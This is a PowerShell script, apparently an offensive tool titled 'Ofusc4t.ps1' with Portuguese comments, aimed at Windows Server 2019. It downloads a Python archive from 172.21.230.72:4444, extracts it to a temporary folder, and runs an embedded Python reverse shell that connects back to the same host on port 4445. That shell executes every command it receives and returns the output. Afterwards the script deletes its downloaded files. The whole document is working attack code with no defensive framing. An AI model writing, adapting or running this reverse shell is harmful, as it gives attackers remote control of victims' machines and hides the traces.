Write-Host "   ___   __                _  _            __"
Write-Host "  / _ \ / _|              | || |          / _|"
Write-Host " | | | | |_ _   _ ___  ___| || |_ _ __  ___| |"
Write-Host " | | | |  _| | | / __|/ __|__   _| '_ \/ __| |"
Write-Host " | |_| | | | |_| \__ \ (__   | |_| |_) \__ \ |"
Write-Host "  \___/|_|  \__,_|___/\___|  |_(_) .__/|___/_|"
Write-Host "                                 | |          "
Write-Host "                                 |_|          "


Write-Host "  _   _     _   _   _   _   _   _   _   _ "
Write-Host " / \ / \   / \ / \ / \ / \ / \ / \ / \ / \"
Write-Host "( B | y ) ( B | l | 4 | d | s | c | 4 | n )"
Write-Host " \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/"

# win server 2019


# URL do arquivo ZIP do Python
$pythonUrl = "http://172.21.230.72:4444/python3.zip"

# Script Python a ser executado
$pythonScript = @"
import socket
import os
import sys

# conexao do netcat

ips = '172.21.230.72'
p = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ips, p))

while True:
    i = s.recv(1024).decode()
    if i.strip().lower() == 'exit':
        s.close()
        sys.exit()
    output = os.popen(i).read()
    s.send(output.encode())
"@

try {
    # Carrega o arquivo ZIP do Python
    $pythonZipPath = Join-Path -Path $env:TEMP -ChildPath 'python3.zip'
    Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonZipPath

    # Define o diretório temporário para extrair os arquivos
    $tempDirectory = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName())
    $extractPath = Join-Path -Path $tempDirectory -ChildPath 'python'

    # Extrai os arquivos do arquivo ZIP para o diretório temporário
    Expand-Archive -Path $pythonZipPath -DestinationPath $extractPath -Force

    # Executa o script Python
    $output = & $extractPath\python.exe -c $pythonScript 2>&1

    # Imprime a saída do script Python
    Write-Output $output
}
catch {
    Write-Error "Ocorreu um erro durante a execução do script: $_"
}
finally {
    # Remove o arquivo ZIP e o diretório temporário
    if (Test-Path $pythonZipPath) {
        Remove-Item -Path $pythonZipPath -Force
    }
    if (Test-Path $extractPath) {
        Remove-Item -Path $extractPath -Recurse -Force
    }
}

